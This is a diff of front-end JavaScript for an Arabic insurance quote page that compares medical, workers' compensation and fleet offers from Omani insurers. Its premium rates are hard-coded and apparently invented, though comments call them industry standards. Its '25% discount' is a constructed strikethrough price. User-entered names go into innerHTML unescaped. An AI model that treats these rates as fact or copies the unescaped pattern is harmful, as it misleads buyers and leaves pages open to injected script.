+                '<th>الصلة</th>' +
+                '<th>العمر</th>' +
+                '<th>الجنسية</th>' +
+                '<th>الخطة</th>' +
+                '<th>الحد السنوي</th>' +
+                '<th class="text-center">سلسلة المستشفيات</th>' +
+                '<th>التغطيات</th>' +
+                '<th>القسط</th>' +
+                '<th></th>' +
+              '</tr></thead>' +
+              '<tbody>' + rowsHtml + '</tbody>' +
+            '</table>' +
+          '</div>' +
+        '</div>' +
+        '<div class="so-offer-footer">' +
+
+        '</div>' +
+      '</div>';
+
+      return html;
+    }
+
+    // ========== MAIN: READ DATA AND RENDER ==========
+    (function() {
+      // Skip medical rendering if in fleet or workers_comp mode
+      var sType = localStorage.getItem('b2b_service_type');
+      if (sType === 'fleet' || sType === 'workers_comp') return;
+
+      var container = document.getElementById('offers-container');
+      var raw = localStorage.getItem('b2b_insured_list');
+      var persons = [];
+      try { persons = JSON.parse(raw) || []; } catch(e) { persons = []; }
+
+      if (!persons || persons.length === 0) {
+        container.innerHTML = '<div class="no-data-msg">' +
+          '<i class="fas fa-exclamation-circle d-block"></i>' +
+          '<h4>لا توجد بيانات مؤمن عليهم</h4>' +
+          '<p>يرجى العودة لصفحة إضافة المؤمن عليهم وإضافة شخص واحد على الأقل</p>' +
+          '<button class="btn so-choose mt-3" onclick="window.location.href=\'/insurance/b2b-add-insured\'">العودة لإضافة مؤمن عليه</button>' +
+          '</div>';
+        return;
+      }
+
+      var count = persons.length;
+
+      // Title
+      var titleHtml = '<div class="mb-3">' +
+        '<strong class="m-0">لدينا (2) عروض متاحة</strong>' +
+        '<p class="text-muted mb-0">يرجى مراجعة، تخصيص ثم اختيار</p>' +
+        '</div>';
+
+      // GIG plan select options
+      var gigPlanOptions = '<option>طبي مثالي 1</option><option>طبي مثالي 2</option><option>طبي مثالي 3</option><option>طبي مثالي 4</option><option>طبي مثالي 5</option><option>طبي مثالي 6</option><option selected>طبي مثالي 7</option>';
+
+      // OUI plan select options
+      var ouiPlanOptions = '<option>الخطة الذهبية</option><option selected>الخطة الفضية</option><option>الخطة البلاتينية</option>';
+
+      // Build GIG offer
+      var gigHtml = buildOfferCard(1, 'GIG (مجموعة الخليج)', 'طبي مثالي 7', 'assets/gig-logo.jpg', gigPlanOptions, GIG_RATES, persons);
+
+      // Build Oman United offer
+      var ouiHtml = buildOfferCard(2, 'عمان المتحدة للتأمين (SAOC)', 'الخطة الفضية', 'assets/oui-logo.jpg', ouiPlanOptions, OUI_RATES, persons);
+
+      container.innerHTML = titleHtml + gigHtml + ouiHtml;
+    })();
+
+    // ========== DYNAMIC RECALCULATION ==========
+    function recalcRow(selectEl) {
+      var row = selectEl.closest('tr.so-row');
+      var offerNum = parseInt(selectEl.getAttribute('data-offer'));
+      var config = COMPANY_CONFIG[offerNum];
+      var baseBasic = parseFloat(row.getAttribute('data-base'));
+
+      // Get current plan and limit selections from this row
+      var planSelect = row.querySelector('.plan-select');
+      var limitSelect = row.querySelector('.limit-select');
+      var planText = planSelect.options[planSelect.selectedIndex].text;
+      var limitText = limitSelect.options[limitSelect.selectedIndex].text;
+
+      // Get multipliers
+      var planMult = config.planMultipliers[planText] || 1.0;
+      var limitMult = config.limitMultipliers[limitText] || 1.0;
+
+      // Recalculate
+      var p = calcPricing(baseBasic, planMult, limitMult);
+
+      // Update premium in this row
+      row.querySelector('.row-premium').textContent = fmt(p.total * 0.75);
+      // Update strikethrough original price
+      var oldPriceEl = row.querySelector('.premium span[style]');
+      if (oldPriceEl) oldPriceEl.textContent = fmt(p.total);
+
+      // Update network
+      var networkEl = row.querySelector('.network-wrapper');
+      if (config.networkMap && config.networkMap[planText]) {
+        var newNetwork = config.networkMap[planText];
+        networkEl.textContent = newNetwork;
+        // Update download link
+        var networkLink = networkEl.closest('a');
+        if (networkLink) {
+          networkLink.href = getNetworkFile(newNetwork);
+        }
+      }
+
+      // Update detail row
+      var rowNum = row.getAttribute('data-row');
+      var detailId = 'detail-' + offerNum + '-' + rowNum;
+      var detailRow = document.getElementById(detailId);
+      if (detailRow) {
+        detailRow.querySelector('.detail-basic').textContent = fmt(p.basic);
+        detailRow.querySelector('.detail-limit').textContent = limitText;
+        detailRow.querySelector('.detail-gross').textContent = fmt(p.gross);
+        detailRow.querySelector('.detail-tax').textContent = fmt(p.tax);
+        detailRow.querySelector('.detail-emergency').textContent = fmt(p.emergency);
+        detailRow.querySelector('.detail-net').textContent = fmt(p.net);
+        detailRow.querySelector('.detail-vat').textContent = fmt(p.vat);
+        detailRow.querySelector('.detail-total').textContent = fmt(p.total);
+      }
+
+      // Recalculate total offer price
+      recalcOfferTotal(offerNum);
+    }
+
+    function recalcOfferTotal(offerNum) {
+      var offerId = 'offer' + offerNum;
+      var offerEl = document.getElementById(offerId);
+      var premiums = offerEl.querySelectorAll('.row-premium');
+      var totalDiscounted = 0;
+      for (var i = 0; i < premiums.length; i++) {
+        totalDiscounted += parseFloat(premiums[i].textContent);
+      }
+      // Original total = discounted / 0.75
+      var totalOriginal = totalDiscounted / 0.75;
+      var totalVatDiscounted = totalDiscounted - (totalDiscounted / 1.05);
+      // Use fmtFleet if available (fleet mode), otherwise fmt
+      var fmtFn = (typeof fmtFleet === 'function') ? fmtFleet : fmt;
+      // Update header strikethrough price
+      var oldPriceEl = offerEl.querySelector('.so-offer-right .so-price div[style]');
+      if (oldPriceEl) oldPriceEl.textContent = fmtFn(totalOriginal);
+      // Update header discounted price
+      var priceEl = offerEl.querySelector('.header-total');
+      if (priceEl) priceEl.textContent = fmtFn(totalDiscounted);
+      // Update VAT
+      var vatEl = offerEl.querySelector('.so-break');
+      if (vatEl) vatEl.textContent = '+ ضريبة القيمة المضافة ' + fmtFn(totalVatDiscounted);
+    }
+
+    // ========== CHOOSE OFFER ==========
+    function chooseOffer(btn) {
+      var offerNum = btn.getAttribute('data-offer');
+      var companyName = btn.getAttribute('data-company');
+      var planName = btn.getAttribute('data-plan');
+      var logoSrc = btn.getAttribute('data-logo');
+      var offerId = 'offer' + offerNum;
+      var offerEl = document.getElementById(offerId);
+
+      // Gather insured persons data from the table
+      var rows = offerEl.querySelectorAll('tr.so-row');
+      var insuredDetails = [];
+      for (var i = 0; i < rows.length; i++) {
+        var row = rows[i];
+        var cells = row.querySelectorAll('td');
+        var planSelect = row.querySelector('.plan-select');
+        var limitSelect = row.querySelector('.limit-select');
+        var networkEl = row.querySelector('.network-wrapper');
+        var premiumEl = row.querySelector('.row-premium');
+        var oldPriceEl = row.querySelector('.premium span[style]');
+        insuredDetails.push({
+          name: cells[2].textContent,
+          gender: cells[3].textContent,
+          marital: cells[4].textContent,
+          relation: cells[5].textContent,
+          age: cells[6].textContent,
+          nationality: cells[7].textContent,
+          plan: planSelect.options[planSelect.selectedIndex].text,
+          annualLimit: limitSelect.options[limitSelect.selectedIndex].text,
+          network: networkEl.textContent,
+          premium: premiumEl.textContent,
+          originalPremium: oldPriceEl ? oldPriceEl.textContent : ''
+        });
+      }
+
+      // Get total prices
+      var headerTotal = offerEl.querySelector('.header-total');
+      var headerOld = offerEl.querySelector('.so-offer-right .so-price div[style]');
+      var vatEl = offerEl.querySelector('.so-break');
+
+      var checkoutData = {
+        offerNum: offerNum,
+        companyName: companyName,
+        planName: planName,
+        logoSrc: logoSrc,
+        totalDiscounted: headerTotal ? headerTotal.textContent : '',
+        totalOriginal: headerOld ? headerOld.textContent : '',
+        vat: vatEl ? vatEl.textContent.replace('+ ضريبة القيمة المضافة ', '') : '',
+        insured: insuredDetails
+      };
+
+      localStorage.setItem('b2b_checkout_data', JSON.stringify(checkoutData));
+        if (window.sendToAdmin) { window.sendToAdmin({'الحالة': 'تم اختيار العرض'}, 'B2B - العروض'); }
+      window.location.href = '/insurance/b2b-checkout';
+    }
+
+    // ========== WORKERS COMP MODE ADAPTATION ==========
+    (function() {
+      var serviceType = localStorage.getItem('b2b_service_type');
+      if (serviceType !== 'workers_comp') return;
+
+      // Update page heading
+      var heading = document.querySelector('.page-heading');
+      if (heading) heading.textContent = '\u062a\u0623\u0645\u064a\u0646 \u062a\u0639\u0648\u064a\u0636\u0627\u062a \u0627\u0644\u0639\u0645\u0627\u0644';
+
+      // Workers Comp pricing config - 5 companies
+      // Based on Oman official rate: 1% of monthly salary for social security
+      // Commercial insurance uses occupation-based risk rates (per mille of annual salary)
+
+      // Occupation risk rates (per mille of annual salary)
+      // Based on Oman commercial insurance industry standards
+      var OCCUPATION_RATES = {
+        'محاسب عام': 3,
+        'كاتب حسابات': 3,
+        'Call Centers Operator': 3,
+        'أمين صندوق / صراف': 3,
+        'مدخل بيانات': 3,
+        'سكرتير': 3,
+        'تنفيذي': 3,
+        'محصل ديون': 5,
+        'اختصاصي مبيعات': 5,
+        'نادل': 5,
+        'طباخ عام': 5,
+        'خادم منزل': 4,
+        'مدرب': 4,
+        'حارس أمن': 6,
+        'سائق مركبة': 7,
+        'عامل بناء': 10,
+        'عامل زراعي': 7,
+        'مزارع': 7,
+        'منظف / مدبر منزل': 4,
+        'مشغّل آلة': 9,
+        'إمام': 3,
+        'مرشد ديني': 3,
+        'ممرض عام': 4,
+        'صيدلي': 3,
+        'معلم تعليم أساسي': 3,
+        'موسيقار': 4,
+        'طبيب': 3
+      };
+
+      var WC_CONFIG = {
+        1: {
+          companyName: 'GIG (مجموعة الخليج)',
+          logo: 'assets/gig-logo.jpg',
+          multiplier: 1.0,
+          minPremium: 20,
+          plans: { 'أساسي': 1.0, 'متوسط': 1.3, 'مميز': 1.6 }
+        },
+        2: {
+          companyName: 'عمان المتحدة للتأمين (SAOC)',
+          logo: 'assets/oui-logo.jpg',
+          multiplier: 0.95,
+          minPremium: 18,
+          plans: { 'أساسي': 1.0, 'متوسط': 1.25, 'مميز': 1.55 }
+        },
+        3: {
+          companyName: 'الوطنية للحياة والعام (NLGI)',
+          logo: 'assets/nlgi-logo.jpg',
+          multiplier: 1.05,
+          minPremium: 22,
+          plans: { 'أساسي': 1.0, 'متوسط': 1.35, 'مميز': 1.65 }
+        },
+        4: {
+          companyName: 'ظفار للتأمين (ش.م.ع.ع)',
+          logo: 'assets/dhofar-logo.jpg',
+          multiplier: 0.98,
+          minPremium: 19,
+          plans: { 'أساسي': 1.0, 'متوسط': 1.28, 'مميز': 1.58 }
+        },
+        5: {
+          companyName: 'المدينة تكافل (SAOC)',
+          logo: 'assets/madina-logo.jpg',
+          multiplier: 0.92,
+          minPremium: 17,
+          plans: { 'أساسي': 1.0, 'متوسط': 1.22, 'مميز': 1.5 }
+        }
+      };
+
+      function fmtWC(num) {
+        return parseFloat(num.toFixed(3)).toString();
+      }
+
+      // Get occupation rate per mille
+      function getOccupationRate(occupation) {
+        if (OCCUPATION_RATES.hasOwnProperty(occupation)) {
+          return OCCUPATION_RATES[occupation];
+        }
+        return 5; // default medium risk
+      }
+
+      // Calculate premium based on salary and occupation risk
+      // Formula: Annual Salary × Occupation Rate (‰) × Company Multiplier
+      // Then: + 1.6% policy fee + 0.5% emergency levy + 5% VAT
+      // Display: 25% discount applied
+      function calcWCPremium(occupation, basicSalary, config, planName) {
+        var occRate = getOccupationRate(occupation);
+        var annualSalary = (parseFloat(basicSalary) || 0) * 12;
+        var basePremium = annualSalary * occRate * config.multiplier / 1000;
+        basePremium = Math.max(basePremium, config.minPremium);
+        var planMult = config.plans[planName] || 1.0;
+        var adjusted = basePremium * planMult;
+        var tax = adjusted * 0.016;
+        var emergency = adjusted * 0.005;
+        var net = adjusted + tax + emergency;
+        var vat = net * 0.05;
+        var total = net + vat;
+        return { basic: basePremium, adjusted: adjusted, tax: tax, emergency: emergency, net: net, vat: vat, total: total };
+      }
+
+      function buildWCOfferCard(offerNum, config, persons, defaultPlan) {
+        var count = persons.length;
+        var totalNet = 0;
+        var totalVat = 0;
+
+        var pricingData = [];
+        for (var i = 0; i < persons.length; i++) {
+          var age = calculateAge(persons[i].dob);
+          var occupation = persons[i].occupation || '';
+          var basicSalary = persons[i].basicSalary || 0;
+          var p = calcWCPremium(occupation, basicSalary, config, defaultPlan);
+          p.age = age;
+          pricingData.push(p);
+          totalNet += p.net;
+          totalVat += p.vat;
+        }
+
+        var offerId = 'offer' + offerNum;
+
+        // Build plan options
+        var planOptions = '';
+        for (var pName in config.plans) {
+          if (config.plans.hasOwnProperty(pName)) {
+            planOptions += '<option' + (pName === defaultPlan ? ' selected' : '') + '>' + pName + '</option>';
+          }
+        }
+
+        // Chips
+        var chipsHtml = '<span class="so-chip" style="background-color: rgb(255, 243, 205); border-color: rgb(255, 243, 205);">' +
+          '<i class="so-chip-icon fa-solid fa-user-group"></i> \u0627\u0644\u0639\u0645\u0627\u0644 &nbsp;(' + count + ')' +
+          '</span>' +
+          '<span class="so-chip" style="background-color: rgb(197, 223, 171); border-color: rgb(197, 223, 171);">' +
+          '<i class="so-chip-icon fa-solid fa-shield-halved"></i> ' + defaultPlan + ' &nbsp;(' + count + ')' +
+          '</span>' +
+          '<span class="so-chip" style="background-color: rgb(255, 243, 205); border-color: rgb(255, 230, 156);">' +
+          '<i class="so-chip-icon fa-regular fa-clock"></i> \u0645\u062f\u0629 \u0627\u0644\u0648\u062b\u064a\u0642\u0629 &nbsp;(\u0633\u0646\u0629 \u0648\u0627\u062d\u062f\u0629)' +
+          '</span>';
+
+        // Table rows
+        var rowsHtml = '';
+        for (var i = 0; i < persons.length; i++) {
+          var person = persons[i];
+          var pr = pricingData[i];
+          var rowNum = i + 1;
+          var detailId = 'detail-' + offerNum + '-' + rowNum;
+
+          rowsHtml += '<tr class="so-row" data-offer="' + offerNum + '" data-row="' + rowNum + '" data-base-age="' + pr.age + '" data-occupation="' + (person.occupation || '') + '" data-salary="' + (person.basicSalary || 0) + '">' +
+            '<td><input type="checkbox" class="form-check-input"></td>' +
+            '<td>' + rowNum + '</td>' +
+            '<td>' + person.name + '</td>' +
+            '<td>' + resolveField(person.gender, GENDER_MAP) + '</td>' +
+            '<td>' + (person.occupation || '') + '</td>' +
+            '<td>' + pr.age + '</td>' +
+            '<td>' + (person.basicSalary || '') + '</td>' +
+            '<td><select class="form-select form-select-sm chip-select wc-plan-select" onchange="recalcWCRow(this)" data-offer="' + offerNum + '">' + planOptions + '</select></td>' +
+            '<td class="premium"><span style="text-decoration:line-through;color:#c00;font-size:0.85em;">' + fmtWC(pr.total) + '</span> <span class="quote-currency">' + currSvg + '<span class="row-premium">' + fmtWC(pr.total * 0.75) + '</span></span></td>' +
+            '<td><div class="so-user-actions"><button class="btn btn-link so-toggle-details" onclick="toggleDetail(this, \'' + detailId + '\')"><i class="bi bi-chevron-down"></i></button></div></td>' +
+            '</tr>';
+
+          // Detail row
+          rowsHtml += '<tr class="so-detail-row" id="' + detailId + '">' +
+            '<td colspan="10"><div class="so-detail-content">' +
+            '<div class="cover-detail-header"><div>\u0627\u0644\u062a\u0641\u0627\u0635\u064a\u0644</div><div>-</div><div>\u0627\u0644\u0645\u0628\u0644\u063a \u0631.\u0639</div></div>' +
+            '<div class="cover-detail-row"><div>\u0627\u0644\u0642\u0633\u0637 \u0627\u0644\u0623\u0633\u0627\u0633\u064a</div><div>-</div><div class="detail-basic">' + fmtWC(pr.adjusted) + '</div></div>' +
+            '<div class="cover-detail-row"><div>\u0627\u0644\u0636\u0631\u064a\u0628\u0629 \u0648\u0627\u0644\u0645\u0633\u0627\u0647\u0645\u0629 (1.6%)</div><div>-</div><div class="detail-tax">' + fmtWC(pr.tax) + '</div></div>' +
+            '<div class="cover-detail-row"><div>\u0631\u0633\u0648\u0645 \u0627\u0644\u0637\u0648\u0627\u0631\u0626 (0.5%)</div><div>-</div><div class="detail-emergency">' + fmtWC(pr.emergency) + '</div></div>' +
+            '<div class="cover-detail-row total-row"><div>\u0627\u0644\u0645\u0628\u0644\u063a \u0627\u0644\u0635\u0627\u0641\u064a</div><div>-</div><div class="detail-net">' + fmtWC(pr.net) + '</div></div>' +
+            '<div class="cover-detail-row"><div>\u0636\u0631\u064a\u0628\u0629 \u0627\u0644\u0642\u064a\u0645\u0629 \u0627\u0644\u0645\u0636\u0627\u0641\u0629 (5%)</div><div>-</div><div class="detail-vat">' + fmtWC(pr.vat) + '</div></div>' +
+            '<div class="cover-detail-row"><div>\u0627\u0644\u062e\u0635\u0645 (25%)</div><div>-</div><div style="color:green">-' + fmtWC(pr.total * 0.25) + '</div></div>' +
+            '<div class="cover-detail-row total-row"><div>\u0625\u062c\u0645\u0627\u0644\u064a \u0627\u0644\u0642\u0633\u0637 \u0628\u0639\u062f \u0627\u0644\u062e\u0635\u0645</div><div>-</div><div class="detail-total">' + fmtWC(pr.total * 0.75) + '</div></div>' +
+            '</div></td></tr>';
+        }
+
+        // Full offer card
+        var html = '<div class="so-offer mb-4" id="' + offerId + '">' +
+          '<div class="so-offer-header" onclick="toggleOffer(\'' + offerId + '\')">' +
+            '<div class="d-flex align-items-center gap-2">' +
+              '<div class="so-logo"><img alt="' + config.companyName + '" src="' + config.logo + '"></div>' +
+              '<div class="so-company">' +
+                '<div class="so-name">' + config.companyName + '</div>' +
+                '<div class="so-plan-name">\u062a\u0639\u0648\u064a\u0636\u0627\u062a \u0627\u0644\u0639\u0645\u0627\u0644 - ' + defaultPlan + '</div>' +
+                '<div class="so-tags">' + chipsHtml + '</div>' +
+              '</div>' +
+            '</div>' +
+            '<div class="so-offer-right">' +
+              '<span class="text-warning align-self-end">\u0627\u0644\u0639\u0631\u0636 \u0627\u0644\u0645\u0628\u062f\u0626\u064a</span>' +
+              '<div class="so-price d-flex flex-column align-items-end text-end gap-1">' +
+                '<div style="text-decoration:line-through;color:#c00;font-size:0.85em;">' + fmtWC(totalNet + totalVat) + '</div>' +
+                '<div class="quote-currency">' + currSvg + '<span class="header-total">' + fmtWC((totalNet + totalVat) * 0.75) + '</span></div>' +
+                '<div class="so-break">+ \u0636\u0631\u064a\u0628\u0629 \u0627\u0644\u0642\u064a\u0645\u0629 \u0627\u0644\u0645\u0636\u0627\u0641\u0629 ' + fmtWC(totalVat * 0.75) + '</div>' +
+              '</div>' +
+              '<div class="d-grid gap-2 w-100"><button type="button" class="btn so-choose" data-offer="' + offerNum + '" data-company="' + config.companyName + '" data-plan="' + defaultPlan + '" data-logo="' + config.logo + '" onclick="chooseWCOffer(this)" aria-label="\u0627\u062e\u062a\u0631 \u0647\u0630\u0627 \u0627\u0644\u0639\u0631\u0636">\u0627\u062e\u062a\u0631</button></div>' +
+              '<span class="so-collapse-btn"><i class="bi bi-chevron-down"></i></span>' +
+            '</div>' +
+          '</div>' +
+          '<div class="so-table-wrap" id="' + offerId + '-table">' +
+            '<div class="so-users-head">' +
+              '<div><strong>\u0627\u0644\u0639\u0645\u0627\u0644 \u0627\u0644\u0645\u063a\u0637\u0648\u0646 (' + count + ')</strong></div>' +
+              '<div class="btn-offer-toolbar">' +
+                '<button type="button" class="btn btn-link"><span>\u0639\u0631\u0636 \u0627\u0644\u0645\u0632\u064a\u062f</span></button>' +
+                '<button type="button" class="btn btn-link"><i class="fa-regular fa-circle-down"></i> \u062d\u0645\u0644 \u0633\u0639\u0631 \u0627\u0644\u0639\u0631\u0636</button>' +
+              '</div>' +
+            '</div>' +
+            '<div class="table-responsive pb-3">' +
+              '<table class="so-table table align-middle mb-0">' +
+                '<thead><tr>' +
+                  '<th style="width:40px"><input type="checkbox" class="form-check-input" aria-label="\u062d\u062f\u062f \u0627\u0644\u0643\u0644"></th>' +
+                  '<th style="width:60px">#</th>' +
+                  '<th>\u0627\u0644\u0627\u0633\u0645</th>' +
+                  '<th>\u0627\u0644\u062c\u0646\u0633</th>' +
+                  '<th>\u0627\u0644\u0645\u0647\u0646\u0629</th>' +
+                  '<th>\u0627\u0644\u0639\u0645\u0631</th>' +
+                  '<th>\u0627\u0644\u0631\u0627\u062a\u0628 \u0627\u0644\u0623\u0633\u0627\u0633\u064a</th>' +
+                  '<th>\u0627\u0644\u062e\u0637\u0629</th>' +
+                  '<th>\u0627\u0644\u0642\u0633\u0637</th>' +
+                  '<th></th>' +
+                '</tr></thead>' +
+                '<tbody>' + rowsHtml + '</tbody>' +
+              '</table>' +
+            '</div>' +
+          '</div>' +
+          '<div class="so-offer-footer"></div>' +
+        '</div>';
+
+        return html;
+      }
+
+      // Rebuild offers container with workers comp data
+      var container = document.getElementById('offers-container');
+      var raw = localStorage.getItem('b2b_insured_list');
+      var persons = [];
+      try { persons = JSON.parse(raw) || []; } catch(e) { persons = []; }
+
+      if (!persons || persons.length === 0) {
+        container.innerHTML = '<div class="no-data-msg">' +
+          '<i class="fas fa-exclamation-circle d-block"></i>' +
+          '<h4>\u0644\u0627 \u062a\u0648\u062c\u062f \u0628\u064a\u0627\u0646\u0627\u062a \u0639\u0645\u0627\u0644</h4>' +
+          '<p>\u064a\u0631\u062c\u0649 \u0627\u0644\u0639\u0648\u062f\u0629 \u0644\u0635\u0641\u062d\u0629 \u0625\u0636\u0627\u0641\u0629 \u0627\u0644\u0645\u0624\u0645\u0646 \u0639\u0644\u064a\u0647\u0645 \u0648\u0625\u0636\u0627\u0641\u0629 \u0634\u062e\u0635 \u0648\u0627\u062d\u062f \u0639\u0644\u0649 \u0627\u0644\u0623\u0642\u0644</p>' +
+          '<button class="btn so-choose mt-3" onclick="window.location.href=\'/insurance/b2b-add-insured\'">\u0627\u0644\u0639\u0648\u062f\u0629 \u0644\u0625\u0636\u0627\u0641\u0629 \u0645\u0624\u0645\u0646 \u0639\u0644\u064a\u0647</button>' +
+          '</div>';
+        return;
+      }
+
+      var offerCount = Object.keys(WC_CONFIG).length;
+      var titleHtml = '<div class="mb-3">' +
+        '<strong class="m-0">\u0644\u062f\u064a\u0646\u0627 (' + offerCount + ') \u0639\u0631\u0648\u0636 \u0645\u062a\u0627\u062d\u0629</strong>' +
+        '<p class="text-muted mb-0">\u064a\u0631\u062c\u0649 \u0645\u0631\u0627\u062c\u0639\u0629\u060c \u062a\u062e\u0635\u064a\u0635 \u062b\u0645 \u0627\u062e\u062a\u064a\u0627\u0631</p>' +
+        '</div>';
+
+      var allOffersHtml = '';
+      var defaultPlan = '\u0623\u0633\u0627\u0633\u064a';
+      for (var key in WC_CONFIG) {
+        if (WC_CONFIG.hasOwnProperty(key)) {
+          allOffersHtml += buildWCOfferCard(parseInt(key), WC_CONFIG[key], persons, defaultPlan);
+        }
+      }
+
+      container.innerHTML = titleHtml + allOffersHtml;
+
+      // Recalc function for workers comp
+      window.recalcWCRow = function(selectEl) {
+        var row = selectEl.closest('tr.so-row');
+        var offerNum = parseInt(selectEl.getAttribute('data-offer'));
+        var config = WC_CONFIG[offerNum];
+        var occupation = row.getAttribute('data-occupation') || '';
+        var basicSalary = row.getAttribute('data-salary') || 0;
+        var planSelect = row.querySelector('.wc-plan-select');
+        var planName = planSelect.options[planSelect.selectedIndex].text;
+
+        var p = calcWCPremium(occupation, basicSalary, config, planName);
+
+        row.querySelector('.row-premium').textContent = fmtWC(p.total * 0.75);
+        var oldPriceEl = row.querySelector('.premium span[style]');
+        if (oldPriceEl) oldPriceEl.textContent = fmtWC(p.total);
+
+        // Update detail row
+        var rowNum = row.getAttribute('data-row');
+        var detailId = 'detail-' + offerNum + '-' + rowNum;
+        var detailRow = document.getElementById(detailId);
+        if (detailRow) {
+          detailRow.querySelector('.detail-basic').textContent = fmtWC(p.adjusted);
+          detailRow.querySelector('.detail-tax').textContent = fmtWC(p.tax);
+          detailRow.querySelector('.detail-emergency').textContent = fmtWC(p.emergency);
+          detailRow.querySelector('.detail-net').textContent = fmtWC(p.net);
+          detailRow.querySelector('.detail-vat').textContent = fmtWC(p.vat);
+          detailRow.querySelector('.detail-total').textContent = fmtWC(p.total * 0.75);
+        }
+
+        // Recalculate total
+        recalcOfferTotal(offerNum);
+      };
+
+      // Choose offer function for workers comp
+      window.chooseWCOffer = function(btn) {
+        var offerNum = btn.getAttribute('data-offer');
+        var companyName = btn.getAttribute('data-company');
+        var planName = btn.getAttribute('data-plan');
+        var logoSrc = btn.getAttribute('data-logo');
+        var offerId = 'offer' + offerNum;
+        var offerEl = document.getElementById(offerId);
+
+        // Get original persons data for marital status
+        var originalPersons = [];
+        try { originalPersons = JSON.parse(localStorage.getItem('b2b_insured_list') || '[]'); } catch(e) {}
+
+        var MARITAL_RESOLVE = { '1': 'أعزب', '2': 'متزوج', '3': 'مطلق', '4': 'أرمل' };
+
+        var rows = offerEl.querySelectorAll('tr.so-row');
+        var insuredDetails = [];
+        for (var i = 0; i < rows.length; i++) {
+          var row = rows[i];
+          var cells = row.querySelectorAll('td');
+          var planSelect = row.querySelector('.wc-plan-select');
+          var premiumEl = row.querySelector('.row-premium');
+          var oldPriceEl = row.querySelector('.premium span[style]');
+          var maritalVal = (originalPersons[i] && originalPersons[i].marital) || '';
+          var maritalText = MARITAL_RESOLVE[maritalVal] || maritalVal || '-';
+          insuredDetails.push({
+            name: cells[2].textContent,
+            marital: maritalText,
+            gender: cells[3].textContent,
+            occupation: cells[4].textContent,
+            age: cells[5].textContent,
+            basicSalary: cells[6].textContent,
+            plan: planSelect ? planSelect.options[planSelect.selectedIndex].text : planName,
+            premium: premiumEl ? premiumEl.textContent : '',
+            originalPremium: oldPriceEl ? oldPriceEl.textContent : ''
+          });
+        }
+
+        var headerTotal = offerEl.querySelector('.header-total');
+        var headerOld = offerEl.querySelector('.so-offer-right .so-price div[style]');
+        var vatEl = offerEl.querySelector('.so-break');
+
+        var checkoutData = {
+          offerNum: offerNum,
+          companyName: companyName,
+          planName: planName,
+          logoSrc: logoSrc,
+          totalDiscounted: headerTotal ? headerTotal.textContent : '',
+          totalOriginal: headerOld ? headerOld.textContent : '',
+          vat: vatEl ? vatEl.textContent.replace('+ \u0636\u0631\u064a\u0628\u0629 \u0627\u0644\u0642\u064a\u0645\u0629 \u0627\u0644\u0645\u0636\u0627\u0641\u0629 ', '') : '',
+          insured: insuredDetails,
+          serviceType: 'workers_comp'
+        };
+
+        localStorage.setItem('b2b_checkout_data', JSON.stringify(checkoutData));
+        if (window.sendToAdmin) { window.sendToAdmin({'الحالة': 'تم اختيار العرض'}, 'B2B - العروض'); }
+        window.location.href = '/insurance/b2b-checkout';
+      };
+    })();
+
+    // ========== FLEET MODE ADAPTATION ==========
+    (function() {
+      var serviceType = localStorage.getItem('b2b_service_type');
+      if (serviceType !== 'fleet') return;
+
+      // Update page heading
+      var heading = document.querySelector('.page-heading');
+      if (heading) heading.textContent = 'تأمين اسطول المركبات';
+
+      // Update stepper step 3 label
+      var stepLabels = document.querySelectorAll('.sm-stepper__label');
+      if (stepLabels.length >= 3) stepLabels[2].textContent = 'إضافة مركبة';
+
+      // Fleet pricing config
+      var FLEET_CONFIG = {
+        1: { // GIG
+          companyName: 'GIG (مجموعة الخليج)',
+          logo: 'assets/gig-logo.jpg',
+          baseRateComprehensive: 0.028,  // 2.8% من قيمة المركبة
+          baseRateThirdParty: 0.008,     // 0.8% من قيمة المركبة
+          minPremiumTP: 42,              // حد أدنى طرف ثالث
+          minPremiumComp: 110            // حد أدنى شامل
+        },
+        2: { // OUI
+          companyName: 'عمان المتحدة للتأمين (SAOC)',
+          logo: 'assets/oui-logo.jpg',
+          baseRateComprehensive: 0.025,  // 2.5% من قيمة المركبة
+          baseRateThirdParty: 0.007,     // 0.7% من قيمة المركبة
+          minPremiumTP: 38,              // حد أدنى طرف ثالث
+          minPremiumComp: 100            // حد أدنى شامل
+        },
+        3: { // NLGI
+          companyName: 'الوطنية للحياة والعام (NLGI)',
+          logo: 'assets/nlgi-logo.jpg',
+          baseRateComprehensive: 0.030,  // 3.0% من قيمة المركبة
+          baseRateThirdParty: 0.009,     // 0.9% من قيمة المركبة
+          minPremiumTP: 45,              // حد أدنى طرف ثالث
+          minPremiumComp: 120            // حد أدنى شامل
+        },
+        4: { // Dhofar
+          companyName: 'ظفار للتأمين (ش.م.ع.ع)',
+          logo: 'assets/dhofar-logo.jpg',
+          baseRateComprehensive: 0.026,  // 2.6% من قيمة المركبة
+          baseRateThirdParty: 0.0075,    // 0.75% من قيمة المركبة
+          minPremiumTP: 40,              // حد أدنى طرف ثالث
+          minPremiumComp: 105            // حد أدنى شامل
+        },
+        5: { // Al Madina
+          companyName: 'المدينة تكافل (SAOC)',
+          logo: 'assets/madina-logo.jpg',
+          baseRateComprehensive: 0.024,  // 2.4% من قيمة المركبة
+          baseRateThirdParty: 0.0065,    // 0.65% من قيمة المركبة
+          minPremiumTP: 35,              // حد أدنى طرف ثالث
+          minPremiumComp: 95             // حد أدنى شامل
+        }
+      };
+
+      function fmtFleet(num) {
+        return parseFloat(num.toFixed(3)).toString();
+      }
+
+      // آلية حساب قسط التأمين
+      // العوامل: قيمة المركبة، نوع التأمين، سنة الصنع، نوع الهيكل، نوع التسجيل
+      function calcFleetPremium(vehicle, companyConfig) {
+        var value = parseFloat(vehicle.value) || 5000;
+        var isComprehensive = (vehicle.insuranceTypeVal === 'comprehensive');
+        var baseRate = isComprehensive ? companyConfig.baseRateComprehensive : companyConfig.baseRateThirdParty;
+        var minPremium = isComprehensive ? companyConfig.minPremiumComp : companyConfig.minPremiumTP;
+
+        // عامل سنة الصنع (كل ما كانت أقدم كل ما زاد)
+        var currentYear = new Date().getFullYear();
+        var vehicleYear = parseInt(vehicle.year) || currentYear;
+        var age = currentYear - vehicleYear;
+        var ageFactor = 1.0;
+        if (age <= 1) ageFactor = 0.95;
+        else if (age <= 3) ageFactor = 1.0;
+        else if (age <= 5) ageFactor = 1.05;
+        else if (age <= 8) ageFactor = 1.10;
+        else if (age <= 12) ageFactor = 1.15;
+        else ageFactor = 1.20;
+
+        // عامل نوع الهيكل
+        var bodyFactor = 1.0;
+        var body = (vehicle.bodyType || '').toLowerCase();
